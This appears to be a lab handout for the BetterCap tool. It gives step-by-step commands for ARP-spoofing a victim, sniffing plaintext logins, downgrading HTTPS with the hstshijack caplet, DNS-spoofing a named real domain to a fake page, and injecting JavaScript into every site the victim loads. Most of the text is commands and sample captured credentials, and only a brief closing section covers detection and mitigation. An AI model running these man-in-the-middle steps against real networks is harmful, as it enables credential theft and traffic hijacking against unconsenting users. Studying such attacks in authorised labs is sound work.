

**Prepared by:** Puru

---

## **1. Introduction to BetterCap**

BetterCap is an advanced network attack and monitoring tool used for:

- **ARP Spoofing** (intercepting connections)
    
- **Data Capture** (usernames, passwords, etc.)
    
- **HTTPS Bypass** (downgrading HTTPS to HTTP)
    
- **DNS Spoofing** (redirecting traffic)
    
- **Code Injection** (JavaScript, HTML)
    

### **Installation (Kali Linux)**

```bash
sudo apt update && sudo apt install bettercap
```

---

## **2. Discovering Network Devices**

### **Step 1: Identify Network Interface**

```bash
ifconfig  # Find active interface (e.g., eth0, wlan0)
```

### **Step 2: Start BetterCap**

```bash
sudo bettercap -iface eth0
```

### **Step 3: Enable Network Discovery**

```bash
net.probe on  # Scans for devices using UDP packets
net.show      # Lists discovered devices (IP, MAC, Vendor)
```

---

## **3. ARP Spoofing (MITM Attack)**

### **Step 1: Configure ARP Spoofing**

```bash
set arp.spoof.fullduplex true  # Spoof both victim & router
set arp.spoof.targets 192.168.200.131  # Target IP
arp.spoof on  # Start attack
```

### **Step 2: Verify MITM Success**

- Check MAC addresses of gateway and victim (should match Kali’s MAC).
    
- Use `net.show` to confirm traffic flows through your machine.
    

### **Step 3: Optional – Disconnect Target**

```bash
arp.ban on  # Blocks victim’s internet
arp.ban off # Restores connection
```

---

## **4. Capturing Traffic**

### **Option A: HTTP Traffic Sniffing**

```bash
net.sniff on  # Captures plaintext data (usernames, passwords)
```

**Example Output:**



```bash
http POST testphp.vulnweb.com/login.php  
username=admin&password=12345
```

### **Option B: HTTP Proxy (Modify Traffic)**

```bash
http.proxy on  # Intercepts & modifies HTTP requests
```
---

## **5. Bypassing HTTPS (Downgrade Attack)**

### **Step 1: Enable Local Sniffing**

```bash
set net.sniff.local true  # Allows sniffing local traffic
```

### **Step 2: Run HSTS Hijack Caplet**

```bash
hstshijack  # Downgrades HTTPS to HTTP
```

**How It Works:**

- Forces victim’s browser to use HTTP instead of HTTPS.
    
- Captures credentials in plaintext.
    

### **Testing on Victim Machine**

1. Clear browser cache (`Ctrl + Shift + Delete`).
    
2. Visit an HTTPS site (e.g., `facebook.com`).
    
3. If downgraded, login credentials appear in BetterCap.
    

---

## **6. DNS Spoofing (Redirecting Traffic)**

### **Step 1: Host a Fake Website**

```bash
sudo service apache2 start  # Start Apache web server
echo ":)" > /var/www/html/index.html  # Replace default page
```
### **Step 2: Configure DNS Spoofing**

```bash
set dns.spoof.all true  # Respond to all DNS queries
set dns.spoof.domains gcit.edu.bt  # Target domain
dns.spoof on  # Start spoofing
```

**Result:**

- Victim visits `gcit.edu.bt` → Redirected to Kali’s fake page (`:)`).
    

---

## **7. JavaScript Injection**

### **Step 1: Create Malicious Script**

```bash
echo 'alert("Hacked!");' > /root/alert.js
```

### **Step 2: Modify HSTS Hijack Payload**

```bash
nano /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap
```

Add:

```bash
set hstshijack.payloads *:/root/alert.js  # Injects into all sites
```

### **Step 3: Run Attack**

```bash
hstshijack  # Victim sees popup on any website
```

---

## **8. Practical Lab Tasks**

|**Task**|**Command**|**Expected Result**|
|---|---|---|
|Discover devices|`net.probe on` → `net.show`|Lists all connected devices|
|ARP Spoofing|`arp.spoof on`|Victim traffic flows through Kali|
|Sniff HTTP traffic|`net.sniff on`|Captures login credentials|
|HTTPS Downgrade|`hstshijack`|Victim loads HTTP instead of HTTPS|
|DNS Spoofing|`dns.spoof on`|Victim redirected to fake site|
|JavaScript Injection|`set hstshijack.payloads *:/alert.js`|Victim sees popup on any website|

---

## **9. Security Considerations**

- **HTTPS Limitations:** Modern sites (Google, Facebook) enforce **HSTS**, making downgrade difficult.
    
- **Detection:** ARP spoofing can be detected by **ARP monitoring tools**.
    
- **Mitigation:** Use **VPNs, HTTPS Everywhere, and HSTS** to prevent MITM attacks.
    

---

## **10. Summary of Key Commands**

|**Command**|**Purpose**|
|---|---|
|`bettercap -iface eth0`|Start BetterCap|
|`net.probe on`|Discover network devices|
|`arp.spoof on`|Start ARP spoofing|
|`net.sniff on`|Capture plaintext traffic|
|`hstshijack`|Downgrade HTTPS to HTTP|
|`dns.spoof on`|Redirect victim to fake site|
|`set hstshijack.payloads *:/x.js`|Inject JavaScript into victim’s browser|

---



